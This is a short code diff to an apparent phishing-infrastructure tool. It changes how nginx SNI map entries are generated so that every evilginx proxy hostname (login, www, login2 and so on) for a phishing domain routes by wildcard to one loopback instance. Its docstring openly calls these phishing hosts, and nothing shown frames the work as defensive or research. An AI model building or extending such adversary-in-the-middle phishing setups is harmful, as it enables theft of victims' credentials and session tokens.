@@ -31,13 +31,26 @@ server {{
 }}
 """
 
+def _root_domain(hostname: str) -> str:
+    """Reduce a phishing host (e.g. login.example.com) to its registrable root
+    (example.com) so one SNI map entry + wildcard routes every evilginx proxy
+    host (login, www, login2, ...) to the same loopback instance."""
+    parts = hostname.split(".")
+    return ".".join(parts[-2:]) if len(parts) >= 3 else hostname
+
+
 def render_sni(instances: dict[str, dict], external_ip: str = "0.0.0.0") -> str:
     entries = []
     snips = []
+    seen = set()
     for hostname, meta in sorted(instances.items()):
-        entries.append(f"    {hostname}    {meta['loopback_ip']}:443;")
-        entries.append(f"    *.{hostname}    {meta['loopback_ip']}:443;")
-        snips.append(f"    {hostname}    {meta['loopback_ip']};")
+        for h in sorted({hostname, _root_domain(hostname)}):
+            if h in seen:
+                continue
+            seen.add(h)
+            entries.append(f"    {h}    {meta['loopback_ip']}:443;")
+            entries.append(f"    *.{h}    {meta['loopback_ip']}:443;")
+            snips.append(f"    {h}    {meta['loopback_ip']};")
     listen_addr = external_ip if external_ip and external_ip != "0.0.0.0" else "0.0.0.0"
     return SNI_TEMPLATE.format(
         listen_addr=listen_addr,
